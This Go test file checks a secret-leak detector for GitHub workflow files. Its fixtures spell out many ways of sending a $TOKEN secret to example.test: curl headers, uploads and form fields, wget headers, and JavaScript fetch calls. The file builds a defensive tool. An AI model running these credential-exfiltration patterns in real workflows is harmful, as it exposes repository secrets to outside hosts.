package taint

import (
	"context"
	"fmt"
	"testing"
	"testing/fstest"

	"github.com/github/gh-aw/pkg/workflow/actions"
	"github.com/github/gh-aw/pkg/workflow/aw"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestSafeOutputIntegrationCredentialPolicy(t *testing.T) {
	for _, tt := range []struct {
		name, run string
		kind      Kind
	}{
		{"arbitrary header", `curl -H "X-Custom-Credential: $TOKEN" https://example.test`, Network},
		{"composed endpoint", `curl "https://example.test/$TOKEN"`, Network},
		{"aliased credential", `COPY="$TOKEN"; curl -d "$COPY" https://example.test`, Network},
		{"reassigned credential", `TOKEN="prefix-$TOKEN"; curl --proxy https://proxy.test "$TOKEN"`, Network},
		{"wget header", `wget --header="X-Custom: $TOKEN" https://example.test`, Network},
		{"stdin payload", `printf '%s' "$TOKEN" | curl -T . https://example.test`, Network},
		{"file payload", `printf '%s' "$TOKEN" > body; curl -T body https://example.test`, Network},
		{"inline variable upload", `INPUT=-; printf '%s' "$TOKEN" | curl --upload-file="$INPUT" https://example.test`, Network},
		{"file header", `printf 'X-Data: %s\n' "$TOKEN" > headers; curl -H @headers https://example.test`, Network},
		{"stdin header", `printf 'X-Data: %s\n' "$TOKEN" | curl --header=@- https://example.test`, Network},
		{"form contents", `printf '%s' "$TOKEN" | curl -F 'text=<-' https://example.test`, Network},
		{"form upload", `printf '%s' "$TOKEN" > body; curl --form='text=@body' https://example.test`, Network},
		{"urlencoded contents", `printf '%s' "$TOKEN" | curl --data-urlencode='text@-' https://example.test`, Network},
		{"log", `echo "$TOKEN"`, Log},
		{"summary", `echo "$TOKEN" >> "$GITHUB_STEP_SUMMARY"`, Summary},
		{"output", `echo "token=$TOKEN" >> "$GITHUB_OUTPUT"`, Output},
		{"xtrace", `set -x; curl -H "X-Custom: $TOKEN" https://example.test`, Log},
	} {
		t.Run(tt.name, func(t *testing.T) {
			for _, section := range []string{"jobs:", "safe-outputs:\n  jobs:", "safe-jobs:"} {
				document, err := aw.Parse("---\n" + section + `
    notify:
      runs-on: ubuntu-latest
      env:
        TOKEN: ${{ format('{0}', secrets.TOKEN) }}
      steps:
        - run: |
            ` + tt.run + "\n---\nNotify.\n")
				require.NoError(t, err)
				result, err := AnalyzeAuthoredDocument(t.Context(), document, SecretLeakRule())
				require.NoError(t, err)
				if section != "jobs:" && tt.kind == Network {
					assert.Empty(t, result.Findings)
				} else {
					count := 1
					if section == "jobs:" && tt.name == "xtrace" {
						count = 2
					}
					require.Len(t, result.Findings, count, "%+v", result.Findings)
					assert.Equal(t, tt.kind, result.Findings[0].Site.Kind)
				}
			}
		})
	}
}

func TestIntegrationPolicyRequiresSafeOutputProvenance(t *testing.T) {
	workflow, err := actions.Parse([]byte(`jobs:
  native:
    runs-on: ubuntu-latest
    steps:
      - run: |
          curl -H "X-Custom: ${{ secrets.TOKEN }}" https://example.test
  integration:
    runs-on: ubuntu-latest
    steps:
      - run: |
          curl -H "X-Custom: ${{ secrets.TOKEN }}" https://example.test
`))
	require.NoError(t, err)
	rule := SecretLeakRule()
	rule.SafeOutputJobs = []string{"integration"}
	result, err := Analyze(workflow, rule)
	require.NoError(t, err)
	require.Len(t, result.Findings, 1)
	assert.Contains(t, result.Findings[0].Site.Path, "jobs.native.")

	document, err := aw.Parse("---\nsafe-outputs:\n  jobs:\n    unrelated:\n      steps: []\n---\nNotify.\n")
	require.NoError(t, err)
	result, err = AnalyzeDocument(document, workflow, SecretLeakRule())
	require.NoError(t, err)
	require.Len(t, result.Findings, 2, "unrelated declarations cannot authorize native jobs")

	rule.ID = "custom-network-rule"
	result, err = Analyze(workflow, rule)
	require.NoError(t, err)
	require.Len(t, result.Findings, 2, "the integration policy belongs to secret-leak, not custom rules")
}

func TestSafeOutputPolicyPreservesPublicationAndDisplay(t *testing.T) {
	document, err := aw.Parse(`---
safe-outputs:
  jobs:
    notify:
      name: ${{ secrets.TOKEN }}
      runs-on: ubuntu-latest
      env:
        TOKEN: ${{ secrets.TOKEN }}
      outputs:
        credential: ${{ secrets.TOKEN }}
      steps:
        - name: ${{ secrets.TOKEN }}
          run: |
            printf '%s' "$TOKEN" > credential.txt
            curl -T credential.txt https://example.test
        - uses: actions/upload-artifact@v4
          with:
            path: credential.txt
        - uses: peter-evans/create-or-update-comment@v4
          with:
            body: ${{ secrets.TOKEN }}
---
${{ secrets.TOKEN }}
`)
	require.NoError(t, err)
	result, err := AnalyzeAuthoredDocument(t.Context(), document, SecretLeakRule())
	require.NoError(t, err)
	var kinds []Kind
	for _, finding := range result.Findings {
		kinds = append(kinds, finding.Site.Kind)
	}
	assert.NotContains(t, kinds, Network)
	for _, kind := range []Kind{Artifact, ActionInput, Display, Output, Prompt} {
		assert.Contains(t, kinds, kind)
	}
}

func TestSafeOutputJavaScriptIntegrationPolicy(t *testing.T) {
	property := func(base *JavaScriptNode, name string) *JavaScriptNode {
		return &JavaScriptNode{Kind: "PropertyAccessExpression", Expression: base, Name: &JavaScriptNode{Kind: "Identifier", Text: name}}
	}
	identifier := func(name string) *JavaScriptNode { return &JavaScriptNode{Kind: "Identifier", Text: name} }
	literal := func(text string) *JavaScriptNode { return &JavaScriptNode{Kind: "StringLiteral", Text: text} }
	call := func(callee *JavaScriptNode, args ...*JavaScriptNode) *JavaScriptNode {
		return &JavaScriptNode{Kind: "CallExpression", Expression: callee, Arguments: args, Line: 1}
	}
	token := property(property(identifier("process"), "env"), "TOKEN")
	header := &JavaScriptNode{Kind: "ObjectLiteralExpression", Properties: []*JavaScriptNode{
		{Kind: "PropertyAssignment", Name: literal("X-Custom-Credential"), Initializer: token},
	}}
	options := &JavaScriptNode{Kind: "ObjectLiteralExpression", Properties: []*JavaScriptNode{
		{Kind: "PropertyAssignment", Name: identifier("headers"), Initializer: header},
	}}
	trees := map[string]*JavaScriptNode{
		"network": call(identifier("fetch"), literal("https://example.test"), options),
		"sdk":     call(property(call(identifier("require"), literal("https")), "request"), literal("https://example.test"), options),
		"module":  call(identifier("require"), literal("./sdk.cjs")),
		"log":     call(property(identifier("console"), "log"), token),
		"output":  call(property(identifier("core"), "setOutput"), literal("credential"), token),
		"summary": call(property(property(identifier("core"), "summary"), "addRaw"), token),
	}
	rule := SecretLeakRule()
	rule.JavaScript = &JavaScriptOptions{
		Parser: javascriptParserFunc(func(_ context.Context, source string) (*JavaScriptNode, error) {
			tree, ok := trees[source]
			require.True(t, ok, "unexpected parser input %q", source)
			return &JavaScriptNode{Kind: "SourceFile", Statements: []*JavaScriptNode{tree}}, nil
		}),
		Files: fstest.MapFS{"sdk.cjs": {Data: []byte("sdk")}},
	}
	for _, tt := range []struct {
		script string
		kind   Kind
	}{
		{"network", Network}, {"sdk", Network}, {"module", Network},
		{"log", Log}, {"output", Output}, {"summary", Summary},
	} {
		for _, entry := range []struct{ mode, fields string }{
			{"inline", "shell: node {0}\n        run: " + tt.script},
			{"shell", "run: node -e '" + tt.script + "'"},
			{"github-script", "uses: actions/github-script@v8\n        with:\n          script: " + tt.script},
		} {
			for _, safeOutput := range []bool{false, true} {
				t.Run(fmt.Sprintf("%s/%s/integration=%t", tt.script, entry.mode, safeOutput), func(t *testing.T) {
					workflow, err := actions.Parse([]byte(`jobs:
  notify:
    runs-on: ubuntu-latest
    steps:
      - env:
          TOKEN: ${{ secrets.TOKEN }}
        ` + entry.fields + "\n"))
					require.NoError(t, err)
					rule.SafeOutputJobs = nil
					if safeOutput {
						rule.SafeOutputJobs = []string{"notify"}
					}
					result, err := Analyze(workflow, rule)
					require.NoError(t, err)
					require.Empty(t, result.Gaps)
					if safeOutput && tt.kind == Network {
						assert.Empty(t, result.Findings)
					} else {
						require.Len(t, result.Findings, 1, "%+v", result.Findings)
						assert.Equal(t, tt.kind, result.Findings[0].Site.Kind)
					}
				})
			}
		}
	}
}
